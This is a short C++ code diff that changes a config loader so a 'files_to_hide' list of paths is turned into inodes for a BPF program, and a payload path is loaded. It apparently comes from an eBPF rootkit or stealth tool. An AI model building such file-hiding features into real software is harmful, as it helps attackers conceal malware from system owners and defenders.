@@ -72,8 +72,12 @@ bool ConfigManager::read() {
         }
 
         // Get all additional inodes
-        for (const auto& inode : config["bpf_program_config"]["inodes"])
-            bpfConf.inodes.push_back(inode.as<uint64_t>());
+        for (const auto& file : config["bpf_program_config"]["files_to_hide"]) {
+            std::string file_str = file.as<std::string>();
+            auto inode = utils::get_inode_of_file(std::filesystem::absolute(file_str));
+            if (inode.has_value())
+                bpfConf.inodes.push_back(inode.value());
+        }
 
         // Load payload path
         payloadConf.path = config["payload"]["path"].as<std::string>();
